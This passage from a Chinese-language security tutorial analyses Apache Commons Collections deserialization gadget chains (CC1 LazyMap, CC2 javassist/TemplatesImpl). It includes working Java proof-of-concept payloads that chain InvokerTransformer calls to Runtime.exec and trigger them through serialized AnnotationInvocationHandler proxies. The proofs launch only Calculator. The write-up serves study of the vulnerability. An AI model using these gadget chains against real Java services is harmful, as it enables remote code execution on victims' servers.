<p>&#x9650;&#x5236;&#x662F;&#xFF1A;&#x5728;&#x4E0D;&#x6539;&#x52A8;&#x4E0B;&#x9762;&#x7684;&#x4EE3;&#x7801;&#x7684;&#x4F20;&#x53C2;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x4E0A;&#x9762;&#x4EE3;&#x7801;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x4E3A; value</p>
<p>&#x53EF;&#x80FD;&#x6D89;&#x53CA;&#x5404;&#x79CD;&#x7248;&#x672C;&#x6539;&#x52A8;&#x95EE;&#x9898;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x7248;&#x672C;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x6211; JDK7u21 &#x7248;&#x672C;&#x4E0B;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x53EA;&#x80FD;&#x4F20;&#x6CE8;&#x89E3;&#x7C7B;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line">InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x770B;&#x4E00;&#x4E0B;&#x6784;&#x9020;&#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210010822748.png" alt></p>
<p>&#x5728; <code>AnnotationInvocationHandler#readObject</code> &#x4E2D; var2 &#x83B7;&#x53D6;&#x5230;&#x6CE8;&#x89E3;&#x7C7B;&#x5B9E;&#x4F8B;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B;&#x5F88;&#x591A;&#x4FE1;&#x606F;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210011230727.png" alt></p>
<p>&#x6838;&#x5FC3;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF0C;&#x4E3A;&#x4E86;&#x89E6;&#x53D1; RCE&#xFF0C;&#x9700;&#x8981;&#x6EE1;&#x8DB3; <code>var7 != null</code>&#xFF0C;var3 &#x662F;&#x83B7;&#x53D6;&#x4E86; var2 &#x4FE1;&#x606F;&#x7684; Hashmap&#xFF0C;var6&#x662F; &#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684; value &#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x51E0;&#x7ECF;&#x5468;&#x8F6C;&#x5728; MapEntry &#x8C03;&#x7528; getKey &#x5F97;&#x5230;&#x3002; &#x56E0;&#x6B64; var7 &#x5176;&#x5B9E;&#x662F;get&#x83B7;&#x53D6;&#x952E;&#x4E3A; &#x201C;value&#x201D; &#x7684;key&#x7684;value&#x503C;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210013650091.png" alt></p>
<p>&#x5F53; innerMap &#x7684;&#x503C;&#x4E3A;&#x5176;&#x4ED6;&#x65F6;&#xFF0C;var7&#x4E3A;&#x7A7A;&#xFF0C;&#x4E0D;&#x4F1A;&#x89E6;&#x53D1;&#x5230;&#x540E;&#x9762;&#x7684;RCE&#x5229;&#x7528;&#x70B9;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210135056946.png" alt></p>
<p>&#x6700;&#x540E;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x9650;&#x5236;&#x4E3A;&#xFF1A;</p>
<ol>
<li>handler &#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x662F;<strong>&#x5143;&#x6CE8;&#x89E3;&#x7C7B;</strong> &#xFF08;&#x5176;&#x5B9E;&#x597D;&#x50CF;&#x4E5F;&#x5C31; Retention &#x8DDF; Target &#x80FD;&#x7528;&#xFF09;</li>
<li>innerMap &#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5FC5;&#x987B;&#x662F;&#x6CE8;&#x89E3;&#x7C7B;&#x7684;&#x65B9;&#x6CD5;&#x540D;</li>
</ol>
<h2 id="LazyMap-Gadget-chain"><a href="#LazyMap-Gadget-chain" class="headerlink" title="LazyMap Gadget chain"></a>LazyMap Gadget chain</h2><p>&#x540C;&#x7406;&#xFF0C;&#x6211;&#x4EEC;&#x5148;&#x5BF9; level-0 &#x7684;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x5347;&#x7EA7;&#xFF0C;&#x4F7F;&#x5176;&#x5229;&#x7528;&#x5230; LazyMap &#x7684;&#x65B9;&#x6CD5;&#x53BB;&#x89E6;&#x53D1; chain &#x7684; transform</p>
<p><strong>Level-1 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Class clz = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">        Constructor construct = clz.getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        LazyMap mapDemo = (LazyMap) construct.newInstance(innerMap, chainDemo);</span><br><span class="line">        mapDemo.get(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>Lazy&#x4E0D;&#x53EF;&#x4EE5;&#x76F4;&#x63A5; new &#x6765;&#x5B9E;&#x4F8B;&#x5316;&#xFF0C;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x8C03;&#x7528;&#x3002;&#x5728;&#x5B9E;&#x4F8B;&#x5316;&#x7684;&#x65F6;&#x5019;&#x8C03;&#x7528;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x5BF9; <code>this.factory</code> &#x8FDB;&#x884C;&#x4E86;&#x9644;&#x503C;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210165032955.png" alt></p>
<p>LazyMap &#x7684; <code>get</code> &#x65B9;&#x6CD5;&#x8C03;&#x7528;&#x4E86;&#x5DF2;&#x7ECF;&#x9644;&#x503C;&#x7684; <code>this.factory</code>  &#x7684; <code>transform</code> &#x65B9;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x624B;&#x52A8;&#x8C03;&#x7528;&#x4E86; LazyMap &#x7684; get &#x65B9;&#x6CD5;&#xFF0C;&#x56E0;&#x6B64;&#x4F1A;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210165212176.png" alt></p>
<p>&#x83B7;&#x53D6;&#x5B9E;&#x4F8B;&#x5316;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; <code>LazyMap#decorate</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210175325623.png" alt></p>
<p><strong>Level-2 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CommandDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        LazyMap mapDemo = (LazyMap) LazyMap.decorate(innerMap, chainDemo);</span><br><span class="line">        mapDemo.get(<span class="hljs-string">&quot;random&quot;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x7531;&#x4E8E;&#x4E0A;&#x9762;&#x6211;&#x4EEC;&#x662F;&#x624B;&#x5DE5;&#x8C03;&#x7528;&#x7684; LazyMap &#x7684; <code>get</code> &#x65B9;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x7ED3;&#x5408;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x81EA;&#x52A8;&#x8C03;&#x7528;&#x7684;&#x8BDD;&#xFF0C;&#x8DDF;&#x4E0A;&#x9762; TransformedMap &#x4E00;&#x6837;&#xFF0C;&#x9700;&#x8981;&#x627E;&#x4E00;&#x4E2A;&#x91CD;&#x5199;&#x7684; <code>readObject</code> &#x91CC;&#x9762;&#x8C03;&#x7528;&#x4E86; <code>get</code> &#x65B9;&#x6CD5;&#x7684;&#x3002;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x8FD8;&#x662F; AnnotationInvocationHandler&#x3002;</p>
<p><strong>Level-3 LazyMap &#x5229;&#x7528;&#x94FE; payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LazyMapDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException,</span></span><br><span class="line"><span class="hljs-function">            IllegalAccessException, InvocationTargetException, InstantiationException, IOException </span>{</span><br><span class="line">        ChainedTransformer chainDemo = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})});</span><br><span class="line">        Map innerMap = <span class="hljs-keyword">new</span> HashMap();</span><br><span class="line">        Class clz = Class.forName(<span class="hljs-string">&quot;org.apache.commons.collections.map.LazyMap&quot;</span>);</span><br><span class="line">        Constructor construct = clz.getDeclaredConstructor(Map.class, Transformer.class);</span><br><span class="line">        construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        LazyMap mapDemo = (LazyMap) construct.newInstance(innerMap, chainDemo);</span><br><span class="line">        Constructor handler_construct = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        handler_construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler map_handler = (InvocationHandler) handler_construct.newInstance(Override.class, mapDemo);</span><br><span class="line">        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="hljs-keyword">new</span> Class[]{Map.class}, map_handler);</span><br><span class="line">        Constructor AnnotationInvocationHandler_Construct = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        AnnotationInvocationHandler_Construct.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Construct.newInstance(Override.class, proxy_map);</span><br><span class="line">              </span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E09;&#x4E2A;&#x5173;&#x952E;&#x70B9;&#xFF1A;<code>this.memberValues</code>&#x3001;<code>invoke</code> &#x548C; <code>this.memberValues.entrySet()</code></p>
<p>&#x9996;&#x5148; <code>this.memberValues</code> &#x5728;&#x7B2C;&#x4E00;&#x4E2A;<code>InvocationHandler</code> &#x5BF9;&#x8C61;&#x4E2D;&#x88AB;&#x8BBE;&#x7F6E;&#x6210;&#x4E86;&#x6784;&#x9020;&#x597D;&#x7684; LazyMap&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x8C03;&#x7528;&#x5176; get &#x65B9;&#x6CD5;&#x5373;&#x53EF; RCE</p>
<p>&#x5176;&#x6B21;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x4E2D;&#xFF0C;&#x8C03;&#x7528;&#x52A8;&#x6001;&#x7684;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;&#x4EFB;&#x4F55;&#x65B9;&#x6CD5;&#xFF0C;&#x5747;&#x4F1A;&#x89E6;&#x53D1;&#x4E4B;&#x524D; <code>InvocationHandler</code> &#x5BF9;&#x8C61;&#x7684; <code>invoke</code> &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210185346055.png" alt></p>
<p>&#x6700;&#x540E;  <code>AnnotationInvocationHandler#invoke</code> &#x4E2D;&#x8C03;&#x7528;&#x4E86; <code>get</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210184040076.png" alt></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		AnnotationInvocationHandler.readObject()</span><br><span class="line">			Map(Proxy).entrySet()</span><br><span class="line">				AnnotationInvocationHandler.invoke()</span><br><span class="line">					LazyMap.get()</span><br><span class="line">						ChainedTransformer.transform()</span><br><span class="line">							ConstantTransformer.transform()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Class.getMethod()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.getRuntime()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><h2 id="Basics-1"><a href="#Basics-1" class="headerlink" title="Basics"></a>Basics</h2><p>javassist &#x52A8;&#x6001;&#x7F16;&#x7A0B;&#x4E3B;&#x8981;&#x662F;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x52A8;&#x6001;&#x7684;&#x751F;&#x6210; Java &#x4EE3;&#x7801;</p>
<p>Demo &#x4EE3;&#x7801;&#x76F4;&#x63A5;&#x5F15;&#x7528; @p1g3 &#x5E08;&#x5085;&#x7684;&#xFF0C;&#x4ECE;&#x521B;&#x5EFA;&#x7C7B;&#x5230;&#x521B;&#x5EFA;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x90FD;&#x6709;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JavassistDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">createPseson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// 1. &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7A7A;&#x7C7B;</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// 2. &#x65B0;&#x589E;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5; private String name;</span></span><br><span class="line">        <span class="hljs-comment">// &#x5B57;&#x6BB5;&#x540D;&#x4E3A;name</span></span><br><span class="line">        CtField param = <span class="hljs-keyword">new</span> CtField(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, cc);</span><br><span class="line">        <span class="hljs-comment">// &#x8BBF;&#x95EE;&#x7EA7;&#x522B;&#x662F; private</span></span><br><span class="line">        param.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="hljs-comment">// &#x521D;&#x59CB;&#x503C;&#x662F; &quot;xiaoming&quot;</span></span><br><span class="line">        cc.addField(param, CtField.Initializer.constant(<span class="hljs-string">&quot;xiaoming&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// 3. &#x751F;&#x6210; getter&#x3001;setter &#x65B9;&#x6CD5;</span></span><br><span class="line">        cc.addMethod(CtNewMethod.setter(<span class="hljs-string">&quot;setName&quot;</span>, param));</span><br><span class="line">        cc.addMethod(CtNewMethod.getter(<span class="hljs-string">&quot;getName&quot;</span>, param));</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// 4. &#x6DFB;&#x52A0;&#x65E0;&#x53C2;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">        CtConstructor cons = <span class="hljs-keyword">new</span> CtConstructor(<span class="hljs-keyword">new</span> CtClass[]{}, cc);</span><br><span class="line">        cons.setBody(<span class="hljs-string">&quot;{name = \&quot;xiaohong\&quot;;}&quot;</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// 5. &#x6DFB;&#x52A0;&#x6709;&#x53C2;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">        cons = <span class="hljs-keyword">new</span> CtConstructor(<span class="hljs-keyword">new</span> CtClass[]{pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>)}, cc);</span><br><span class="line">        <span class="hljs-comment">// $0=this / $1,$2,$3... &#x4EE3;&#x8868;&#x65B9;&#x6CD5;&#x53C2;&#x6570;</span></span><br><span class="line">        cons.setBody(<span class="hljs-string">&quot;{$0.name = $1;}&quot;</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// 6. &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;printName&#x65B9;&#x6CD5;&#xFF0C;&#x65E0;&#x53C2;&#x6570;&#xFF0C;&#x65E0;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x8F93;&#x51FA;name&#x503C;</span></span><br><span class="line">        CtMethod ctMethod = <span class="hljs-keyword">new</span> CtMethod(CtClass.voidType, <span class="hljs-string">&quot;printName&quot;</span>, <span class="hljs-keyword">new</span> CtClass[]{}, cc);</span><br><span class="line">        ctMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        ctMethod.setBody(<span class="hljs-string">&quot;{System.out.println(name);}&quot;</span>);</span><br><span class="line">        cc.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">//&#x8FD9;&#x91CC;&#x4F1A;&#x5C06;&#x8FD9;&#x4E2A;&#x521B;&#x5EFA;&#x7684;&#x7C7B;&#x5BF9;&#x8C61;&#x7F16;&#x8BD1;&#x4E3A;.class&#x6587;&#x4EF6;</span></span><br><span class="line">        cc.writeFile(<span class="hljs-string">&quot;./&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            createPseson();</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x53CD;&#x7F16;&#x8BD1;&#x4E00;&#x4E0B; Person.class &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6700;&#x7EC8;&#x6784;&#x9020;&#x51FA;&#x6765;&#x7684;&#x4EE3;&#x7801;&#x662F;&#x8FD9;&#x6837;&#x7684;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211145943465.png" alt></p>
<p>javassist &#x5E26;&#x6765;&#x7684;&#x653B;&#x51FB;&#x9762;&#x5728;&#x4E8E; Java &#x8FDB;&#x884C;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x8C03;&#x7528; static &#x4EE3;&#x7801;&#x5757;</p>
<p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A; class</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, CannotCompileException, NotFoundException </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.writeFile();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213022249941.png" alt></p>
<p>&#x63A5;&#x4E0B;&#x6765;&#x5229;&#x7528; TemplatesImpl &#x6765;&#x66F4;&#x8FDB;&#x4E00;&#x6B65;</p>
<p><code>TemplatesImpl#newTransformer</code> &#x8C03;&#x7528;&#x4E86; <code>getTransletInstance</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213133100734.png" alt></p>
<p>&#x5148;&#x770B;&#x7B2C;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x5982;&#x679C;  <code>_name</code> &#x4E0D;&#x4E3A;null&#x7684;&#x503C;&#xFF0C;<code>_class</code>&#x8BBE;&#x7F6E;&#x4E3A; null&#xFF0C;&#x8FD9;&#x6837;&#x4F1A;&#x8C03;&#x7528; <code>defineTransletClases</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213133539904.png" alt></p>
<p>&#x8DDF;&#x8FDB;  <code>defineTransletClases</code>&#xFF0C;&#x6CE8;&#x610F;&#x51E0;&#x4E2A;&#x95EE;&#x9898;</p>
<p><code>_class[i] = loader.defineClass(_bytecodes[i]);</code> &#x5BF9; byte &#x8FDB;&#x884C;&#x4E86;&#x8FD8;&#x539F;</p>
